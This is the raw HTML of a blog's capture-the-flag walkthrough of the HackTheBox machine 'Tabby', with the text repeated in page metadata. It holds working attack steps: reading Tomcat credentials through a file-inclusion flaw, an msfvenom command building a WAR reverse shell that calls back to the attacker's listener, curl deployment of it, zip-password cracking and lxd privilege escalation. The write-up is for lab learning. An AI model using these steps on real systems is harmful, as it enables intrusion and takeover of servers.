<!DOCTYPE html> <html lang="en-US"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=Edge"> <title>Tabby - 0xbro@blog</title> <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"> <link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script> <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Begin Jekyll SEO tag v2.7.1 --> <title>Tabby | 0xbro@blog</title> <meta name="generator" content="Jekyll v4.2.0" /> <meta property="og:title" content="Tabby" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="05 Jul 2020 | Reading time: ~5 min HackTheBox - Tabby [Easy] #HackTheBox #Easy #Linux #LFI #WAR #tomcat #cracking-zip-files #lxd-privesc #B2R Table of contents Improved skills: Used tools: Introduction &amp; Foothold Lateral Movement to ash Privilege Escalation Trophy License Improved skills: LFI Tomcat WAR exploitation Cracking .zip files lxd Privilege Escalation Used tools: nmap gobuster msfvenom LinEnum.sh fcrackzip Introduction &amp; Foothold Tabby is an easy HTB machine focused on the manually exploitation of a Tomacat server using a .WAR reverse shell and the exploitation of a misconfigured group permission which allow to escalate to root abusing lxd rights. Letâ€™s start as always with an nmap scan: root@kali:~/HackTheBox# nmap -Pn -sCV -p22,80,8080 -oN nmap/Basic_10.10.10.194.nmap 10.10.10.194 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat 9.0.31 |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We find out that there are three services running on the box, two of which are web servers (an Apache httpd 2.4.41 and an Apache Tomcat 9.0.31). Visiting the first site we discover that the host of the box is megahosting.htb. In order to properly enumerate the box we need to resolve it correctly echo &quot;10.10.10.194Â Â Â Â megahosting.it&quot; &gt;&gt; /etc/hosts Now that we are effectively ready, letâ€™s start enumerating every page of the first web server. After few minutes I found the http://megahosting.htb/news.php?file=statement page, which results to be vulnerable to Local File Inclusion (LFI). Because we got an LFI vulnerability, the logical next step was to try to exploit it in order to get a Remote Code Execution, but unfortunately none of the existing methods workedâ€¦ so I decided to start to enumerate the second web server (tomcat), looking for another entry point. root@kali:~/HackTheBox# gobuster dir -u http://10.10.10.194:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.txt ... /index.html (Status: 200) /docs (Status: 302) /examples (Status: 302) /manager (Status: 302) Among all the various directories, /manager immediately caught my attention: trying to logging in, the server reveals which file contains the credentials, allowing us to use the LFI to get them. Finding tomcat-users.xml was a pain as the installation of the web server was done without following standards paths and rules, however, after a couple of hours I was able to read the file, located in /usr/share/tomcat9/etc/tomcat-users.xml Good! Now we are able to login into the /manager directory and proceeds. Since the tomcat user are assigned the roles of admin-gui and manager-script, he has the permission to access the host-manager webapp via web gui (from which nothing can be done) but also to interact via cli with the manager webapp, which allows us to upload .war files to the server (see the official documentation). Once we find the way, letâ€™s create our reverse shell through msfconsole root@kali:/var/www/html# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=9876 -f war &gt; maoutis.war Payload size: 1095 bytes Final size of war file: 1095 bytes root@kali:/var/www/html# ls -al maoutis.war -rw-r--r-- 1 root root 1095 Jun 29 19:08 maoutis.war load it on the server root@kali:~/HackTheBox/Machine/Tabby/files# curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; -T maoutis.war &#39;http://10.10.10.194:8080/manager/text/deploy?path=/maoutis&#39; OK - Deployed application at context path [/maoutis] root@kali:~/HackTheBox/Machine/Tabby/files# curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/manager/text/list OK - Listed applications for virtual host [localhost] /:running:0:ROOT /maoutis:running:0:maoutis /examples:running:0:/usr/share/tomcat9-examples/examples /host-manager:running:1:/usr/share/tomcat9-admin/host-manager /manager:running:0:/usr/share/tomcat9-admin/manager /docs:running:0:/usr/share/tomcat9-docs/docs and run it to get access as *tomcat* user. root@kali:~/HackTheBox/Machine/Tabby/files# curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/maoutis/ root@kali:~# nc -lvp 9876 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; tomcat@tabby:/var/lib/tomcat9$ export TERM=screen CTRL+Z root@kali:~/HackTheBox# stty raw -echo root@kali:~/HackTheBox# fg tomcat@tabby:/var/lib/tomcat9$ Lateral Movement to ash Once gained the shell, further enumeration reveals that the user of the box is ash. Running LinEnum.sh we discovered a .zip backup file inside /var/www/html/files/ which require to be cracked in order to be unzipped. Letâ€™s use fcrackzip in order to crack the archive. root@kali:~/HackTheBox/Machine/Tabby/files# fcrackzip -u -D -p &#39;/usr/share/wordlists/rockyou.txt&#39; 16162020_backup.zip PASSWORD FOUND!!!!: pw == admin@it Password found! While inside the archive we didnâ€™t find anything useful, trying to use the password to switch to ash reveals that the same password has been reused. tomcat@tabby:/var/www/html/files$ su ash Password: admin@it ash@tabby:/var/www/html/files$ uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) Well done! We are ash! Privilege Escalation Running again LinEnum.sh it reveals that we are members of the lxd group and that exists a way to abuse this permission in order to became root. Searching on Google I found this article, which describes how an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD. First, download the lxd-alpine-builder locally on the kali machine and built it as root $git clone https://github.com/saghul/lxd-alpine-builder.git $cd lxd-alpine-builder $sudo bash build-alpine Probably will appear errors like â€œtar: Ignoring unknow â€¦ â€œ. Donâ€™t worry and continue Â Â Â Â with the privilege escalation process. Then upload the .tar file on the ash home directory and import it inside lxc Once finished, we will be root! Trophy If you can&#39;t give me poetry, can&#39;t you give me poetical science? - Ada Lovelace License Author: 0xbro This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License &lt;path d=&quot;M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z&quot; &quot;/&gt; Share Made by 0xbro with ðŸ’œ ðŸ’›" /> <meta property="og:description" content="05 Jul 2020 | Reading time: ~5 min HackTheBox - Tabby [Easy] #HackTheBox #Easy #Linux #LFI #WAR #tomcat #cracking-zip-files #lxd-privesc #B2R Table of contents Improved skills: Used tools: Introduction &amp; Foothold Lateral Movement to ash Privilege Escalation Trophy License Improved skills: LFI Tomcat WAR exploitation Cracking .zip files lxd Privilege Escalation Used tools: nmap gobuster msfvenom LinEnum.sh fcrackzip Introduction &amp; Foothold Tabby is an easy HTB machine focused on the manually exploitation of a Tomacat server using a .WAR reverse shell and the exploitation of a misconfigured group permission which allow to escalate to root abusing lxd rights. Letâ€™s start as always with an nmap scan: root@kali:~/HackTheBox# nmap -Pn -sCV -p22,80,8080 -oN nmap/Basic_10.10.10.194.nmap 10.10.10.194 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat 9.0.31 |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We find out that there are three services running on the box, two of which are web servers (an Apache httpd 2.4.41 and an Apache Tomcat 9.0.31). Visiting the first site we discover that the host of the box is megahosting.htb. In order to properly enumerate the box we need to resolve it correctly echo &quot;10.10.10.194Â Â Â Â megahosting.it&quot; &gt;&gt; /etc/hosts Now that we are effectively ready, letâ€™s start enumerating every page of the first web server. After few minutes I found the http://megahosting.htb/news.php?file=statement page, which results to be vulnerable to Local File Inclusion (LFI). Because we got an LFI vulnerability, the logical next step was to try to exploit it in order to get a Remote Code Execution, but unfortunately none of the existing methods workedâ€¦ so I decided to start to enumerate the second web server (tomcat), looking for another entry point. root@kali:~/HackTheBox# gobuster dir -u http://10.10.10.194:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.txt ... /index.html (Status: 200) /docs (Status: 302) /examples (Status: 302) /manager (Status: 302) Among all the various directories, /manager immediately caught my attention: trying to logging in, the server reveals which file contains the credentials, allowing us to use the LFI to get them. Finding tomcat-users.xml was a pain as the installation of the web server was done without following standards paths and rules, however, after a couple of hours I was able to read the file, located in /usr/share/tomcat9/etc/tomcat-users.xml Good! Now we are able to login into the /manager directory and proceeds. Since the tomcat user are assigned the roles of admin-gui and manager-script, he has the permission to access the host-manager webapp via web gui (from which nothing can be done) but also to interact via cli with the manager webapp, which allows us to upload .war files to the server (see the official documentation). Once we find the way, letâ€™s create our reverse shell through msfconsole root@kali:/var/www/html# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=9876 -f war &gt; maoutis.war Payload size: 1095 bytes Final size of war file: 1095 bytes root@kali:/var/www/html# ls -al maoutis.war -rw-r--r-- 1 root root 1095 Jun 29 19:08 maoutis.war load it on the server root@kali:~/HackTheBox/Machine/Tabby/files# curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; -T maoutis.war &#39;http://10.10.10.194:8080/manager/text/deploy?path=/maoutis&#39; OK - Deployed application at context path [/maoutis] root@kali:~/HackTheBox/Machine/Tabby/files# curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/manager/text/list OK - Listed applications for virtual host [localhost] /:running:0:ROOT /maoutis:running:0:maoutis /examples:running:0:/usr/share/tomcat9-examples/examples /host-manager:running:1:/usr/share/tomcat9-admin/host-manager /manager:running:0:/usr/share/tomcat9-admin/manager /docs:running:0:/usr/share/tomcat9-docs/docs and run it to get access as *tomcat* user. root@kali:~/HackTheBox/Machine/Tabby/files# curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/maoutis/ root@kali:~# nc -lvp 9876 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; tomcat@tabby:/var/lib/tomcat9$ export TERM=screen CTRL+Z root@kali:~/HackTheBox# stty raw -echo root@kali:~/HackTheBox# fg tomcat@tabby:/var/lib/tomcat9$ Lateral Movement to ash Once gained the shell, further enumeration reveals that the user of the box is ash. Running LinEnum.sh we discovered a .zip backup file inside /var/www/html/files/ which require to be cracked in order to be unzipped. Letâ€™s use fcrackzip in order to crack the archive. root@kali:~/HackTheBox/Machine/Tabby/files# fcrackzip -u -D -p &#39;/usr/share/wordlists/rockyou.txt&#39; 16162020_backup.zip PASSWORD FOUND!!!!: pw == admin@it Password found! While inside the archive we didnâ€™t find anything useful, trying to use the password to switch to ash reveals that the same password has been reused. tomcat@tabby:/var/www/html/files$ su ash Password: admin@it ash@tabby:/var/www/html/files$ uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) Well done! We are ash! Privilege Escalation Running again LinEnum.sh it reveals that we are members of the lxd group and that exists a way to abuse this permission in order to became root. Searching on Google I found this article, which describes how an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD. First, download the lxd-alpine-builder locally on the kali machine and built it as root $git clone https://github.com/saghul/lxd-alpine-builder.git $cd lxd-alpine-builder $sudo bash build-alpine Probably will appear errors like â€œtar: Ignoring unknow â€¦ â€œ. Donâ€™t worry and continue Â Â Â Â with the privilege escalation process. Then upload the .tar file on the ash home directory and import it inside lxc Once finished, we will be root! Trophy If you can&#39;t give me poetry, can&#39;t you give me poetical science? - Ada Lovelace License Author: 0xbro This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License &lt;path d=&quot;M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z&quot; &quot;/&gt; Share Made by 0xbro with ðŸ’œ ðŸ’›" /> <link rel="canonical" href="https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/" /> <meta property="og:url" content="https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/" /> <meta property="og:site_name" content="0xbro@blog" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2020-07-05T00:00:00+02:00" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Tabby" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"Tabby","url":"https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/","datePublished":"2020-07-05T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/"},"dateModified":"2020-07-05T00:00:00+02:00","description":"05 Jul 2020 | Reading time: ~5 min HackTheBox - Tabby [Easy] #HackTheBox #Easy #Linux #LFI #WAR #tomcat #cracking-zip-files #lxd-privesc #B2R Table of contents Improved skills: Used tools: Introduction &amp; Foothold Lateral Movement to ash Privilege Escalation Trophy License Improved skills: LFI Tomcat WAR exploitation Cracking .zip files lxd Privilege Escalation Used tools: nmap gobuster msfvenom LinEnum.sh fcrackzip Introduction &amp; Foothold Tabby is an easy HTB machine focused on the manually exploitation of a Tomacat server using a .WAR reverse shell and the exploitation of a misconfigured group permission which allow to escalate to root abusing lxd rights. Letâ€™s start as always with an nmap scan: root@kali:~/HackTheBox# nmap -Pn -sCV -p22,80,8080 -oN nmap/Basic_10.10.10.194.nmap 10.10.10.194 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat 9.0.31 |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We find out that there are three services running on the box, two of which are web servers (an Apache httpd 2.4.41 and an Apache Tomcat 9.0.31). Visiting the first site we discover that the host of the box is megahosting.htb. In order to properly enumerate the box we need to resolve it correctly echo &quot;10.10.10.194Â Â Â Â megahosting.it&quot; &gt;&gt; /etc/hosts Now that we are effectively ready, letâ€™s start enumerating every page of the first web server. After few minutes I found the http://megahosting.htb/news.php?file=statement page, which results to be vulnerable to Local File Inclusion (LFI). Because we got an LFI vulnerability, the logical next step was to try to exploit it in order to get a Remote Code Execution, but unfortunately none of the existing methods workedâ€¦ so I decided to start to enumerate the second web server (tomcat), looking for another entry point. root@kali:~/HackTheBox# gobuster dir -u http://10.10.10.194:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.txt ... /index.html (Status: 200) /docs (Status: 302) /examples (Status: 302) /manager (Status: 302) Among all the various directories, /manager immediately caught my attention: trying to logging in, the server reveals which file contains the credentials, allowing us to use the LFI to get them. Finding tomcat-users.xml was a pain as the installation of the web server was done without following standards paths and rules, however, after a couple of hours I was able to read the file, located in /usr/share/tomcat9/etc/tomcat-users.xml Good! Now we are able to login into the /manager directory and proceeds. Since the tomcat user are assigned the roles of admin-gui and manager-script, he has the permission to access the host-manager webapp via web gui (from which nothing can be done) but also to interact via cli with the manager webapp, which allows us to upload .war files to the server (see the official documentation). Once we find the way, letâ€™s create our reverse shell through msfconsole root@kali:/var/www/html# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=9876 -f war &gt; maoutis.war Payload size: 1095 bytes Final size of war file: 1095 bytes root@kali:/var/www/html# ls -al maoutis.war -rw-r--r-- 1 root root 1095 Jun 29 19:08 maoutis.war load it on the server root@kali:~/HackTheBox/Machine/Tabby/files# curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; -T maoutis.war &#39;http://10.10.10.194:8080/manager/text/deploy?path=/maoutis&#39; OK - Deployed application at context path [/maoutis] root@kali:~/HackTheBox/Machine/Tabby/files# curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/manager/text/list OK - Listed applications for virtual host [localhost] /:running:0:ROOT /maoutis:running:0:maoutis /examples:running:0:/usr/share/tomcat9-examples/examples /host-manager:running:1:/usr/share/tomcat9-admin/host-manager /manager:running:0:/usr/share/tomcat9-admin/manager /docs:running:0:/usr/share/tomcat9-docs/docs and run it to get access as *tomcat* user. root@kali:~/HackTheBox/Machine/Tabby/files# curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/maoutis/ root@kali:~# nc -lvp 9876 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; tomcat@tabby:/var/lib/tomcat9$ export TERM=screen CTRL+Z root@kali:~/HackTheBox# stty raw -echo root@kali:~/HackTheBox# fg tomcat@tabby:/var/lib/tomcat9$ Lateral Movement to ash Once gained the shell, further enumeration reveals that the user of the box is ash. Running LinEnum.sh we discovered a .zip backup file inside /var/www/html/files/ which require to be cracked in order to be unzipped. Letâ€™s use fcrackzip in order to crack the archive. root@kali:~/HackTheBox/Machine/Tabby/files# fcrackzip -u -D -p &#39;/usr/share/wordlists/rockyou.txt&#39; 16162020_backup.zip PASSWORD FOUND!!!!: pw == admin@it Password found! While inside the archive we didnâ€™t find anything useful, trying to use the password to switch to ash reveals that the same password has been reused. tomcat@tabby:/var/www/html/files$ su ash Password: admin@it ash@tabby:/var/www/html/files$ uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) Well done! We are ash! Privilege Escalation Running again LinEnum.sh it reveals that we are members of the lxd group and that exists a way to abuse this permission in order to became root. Searching on Google I found this article, which describes how an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD. First, download the lxd-alpine-builder locally on the kali machine and built it as root $git clone https://github.com/saghul/lxd-alpine-builder.git $cd lxd-alpine-builder $sudo bash build-alpine Probably will appear errors like â€œtar: Ignoring unknow â€¦ â€œ. Donâ€™t worry and continue Â Â Â Â with the privilege escalation process. Then upload the .tar file on the ash home directory and import it inside lxc Once finished, we will be root! Trophy If you can&#39;t give me poetry, can&#39;t you give me poetical science? - Ada Lovelace License Author: 0xbro This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License &lt;path d=&quot;M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z&quot; &quot;/&gt; Share Made by 0xbro with ðŸ’œ ðŸ’›","@context":"https://schema.org"}</script> <!-- End Jekyll SEO tag --> </head> <body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"> <title>Link</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"> <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"> <title>Search</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"> <title>Menu</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"> <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"> <title>Expand</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"> <polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"> <title>Document</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"> <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <div class="side-bar"> <div class="site-header"> <a href="https://maoutis.github.io/" class="site-title lh-tight"> 0xbro@blog </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a> </div> <nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"> <div class="nav-category">Pages</div> <ul class="nav-list"><li class="nav-list-item"><a href="https://maoutis.github.io/" class="nav-list-link">Home</a></li><li class="nav-list-item"><a href="https://maoutis.github.io/about/" class="nav-list-link">About me</a></li><li class="nav-list-item"><a href="https://maoutis.github.io/achievements/" class="nav-list-link">Roadmap</a></li></ul> <div class="nav-category">Writeups</div> <ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/writeups/HackTheBox/" class="nav-list-link">HackTheBox</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-12-12-Ready/" class="nav-list-link">Ready</a></li><li class="nav-list-item active"><a href="https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/" class="nav-list-link active">Tabby</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-05-30-Blunder/" class="nav-list-link">Blunder</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-03-14-Traceback/" class="nav-list-link">Traceback</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-01-04-OpenAdmin/" class="nav-list-link">OpenAdmin</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-11-30-Obscurity/" class="nav-list-link">Obscurity</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-11-16-Traverxec/" class="nav-list-link">Traverxec</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-11-02-Postman/" class="nav-list-link">Postman</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-06-08-Writeup/" class="nav-list-link">Writeup</a></li></ul></li></ul> <div class="nav-category">Articles and Posts</div> <ul class="nav-list"><li class="nav-list-item"><a href="https://maoutis.github.io/posts/2021-01-17-My-OSCP-Jurney/" class="nav-list-link">My OSCP Jurney</a></li></ul> </nav> <footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll. </footer> </div> <div class="main" id="top"> <div id="main-header" class="main-header"> <div class="search"> <div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search 0xbro@blog" aria-label="Search 0xbro@blog" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label> </div> <div id="search-results" class="search-results"></div> </div> <nav aria-label="Auxiliary" class="aux-nav"> <ul class="aux-nav-list"> <li class="aux-nav-list-item"> <a href="/socials/" class="site-button" > Socials </a> </li> </ul> </nav> </div> <div id="main-content-wrap" class="main-content-wrap"> <nav aria-label="Breadcrumb" class="breadcrumb-nav"> <ol class="breadcrumb-nav-list"> <li class="breadcrumb-nav-list-item"><a href="">HackTheBox</a></li> <li class="breadcrumb-nav-list-item"><span>Tabby</span></li> </ol> </nav> <div id="main-content" class="main-content" role="main"> <style> .time { text-align: center; margin-top: 30px; font-family: 'Open Sans', sans-serif; font-weight: 300; font-style: normal; } </style> <p class="time">05 Jul 2020 | Reading time: ~5 min</p> <h1 align="center"> HackTheBox - Tabby [Easy] </h1> <p class="time" style="font-size: 75%;"> #HackTheBox #Easy #Linux #LFI #WAR #tomcat #cracking-zip-files #lxd-privesc #B2R </p> <p><img src="/assets/images/Screenshots/Tabby/tabby.png" alt="tabby.png" /></p><hr /> <h2 class="no_toc text-delta" id="table-of-contents"> <a href="#table-of-contents" class="anchor-heading" aria-labelledby="table-of-contents"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Table of contents </h2> <ol id="markdown-toc"> <li><a href="#improved-skills" id="markdown-toc-improved-skills">Improved skills:</a></li> <li><a href="#used-tools" id="markdown-toc-used-tools">Used tools:</a></li> <li><a href="#introduction--foothold" id="markdown-toc-introduction--foothold">Introduction &amp; Foothold</a></li> <li><a href="#lateral-movement-to-ash" id="markdown-toc-lateral-movement-to-ash">Lateral Movement to ash</a></li> <li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a></li> <li><a href="#trophy" id="markdown-toc-trophy">Trophy</a></li> <li><a href="#license" id="markdown-toc-license">License</a></li> </ol><hr /> <h3 id="improved-skills"> <a href="#improved-skills" class="anchor-heading" aria-labelledby="improved-skills"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Improved skills: </h3> <ul> <li>LFI</li> <li>Tomcat WAR exploitation</li> <li>Cracking .zip files</li> <li>lxd Privilege Escalation</li> </ul> <h3 id="used-tools"> <a href="#used-tools" class="anchor-heading" aria-labelledby="used-tools"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Used tools: </h3> <ul> <li>nmap</li> <li>gobuster</li> <li>msfvenom</li> <li>LinEnum.sh</li> <li>fcrackzip</li> </ul><hr /> <h2 id="introduction--foothold"> <a href="#introduction--foothold" class="anchor-heading" aria-labelledby="introduction--foothold"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Introduction &amp; Foothold </h2> <p><strong>Tabby</strong> is an <em>easy</em> HTB machine focused on the manually exploitation of a <strong>Tomacat</strong> server using a <strong>.WAR</strong> reverse shell and the exploitation of a misconfigured group permission which allow to escalate to root abusing <strong>lxd</strong> rights.</p> <p>Letâ€™s start as always with an <strong>nmap</strong> scan:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HackTheBox# nmap <span class="nt">-Pn</span> <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,8080 <span class="nt">-oN</span> nmap/Basic_10.10.10.194.nmap 10.10.10.194
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat 9.0.31
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div> <p>We find out that there are three services running on the box, <strong>two of which</strong> are <strong>web servers</strong> (an <em>Apache httpd 2.4.41</em> and an <em>Apache Tomcat 9.0.31</em>).</p> <p>Visiting the first site we discover that the <strong>host</strong> of the box is <strong><em>megahosting.htb</em></strong>. In order to properly enumerate the box we need to resolve it correctly</p> <p><code class="language-plaintext highlighter-rouge">echo "10.10.10.194Â Â Â Â megahosting.it" &gt;&gt; /etc/hosts</code></p> <p>Now that we are effectively ready, letâ€™s start enumerating every page of the first web server.</p> <p><img src="/assets/images/Screenshots/Tabby/2020-06-22-14-48-13.png" alt="2020-06-22-14-48-13.png" /></p> <p>After few minutes I found the <strong><em>http://megahosting.htb/news.php?file=statement</em></strong> page, which results to be vulnerable to <strong>Local File Inclusion</strong> (LFI).</p> <p><img src="/assets/images/Screenshots/Tabby/2020-06-22-14-59-19.png" alt="2020-06-22-14-59-19.png" /></p> <p><img src="/assets/images/Screenshots/Tabby/2020-06-22-14-59-41.png" alt="2020-06-22-14-59-41.png" /></p> <p>Because we got an LFI vulnerability, the logical next step was to try to exploit it in order to get a Remote Code Execution, but unfortunately none of the existing methods workedâ€¦ so I decided to start to enumerate the second web server (<strong>tomcat</strong>), looking for another entry point.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HackTheBox# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.194:8080/ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-x</span> .php,.html,.txt
...
/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
/docs <span class="o">(</span>Status: 302<span class="o">)</span>
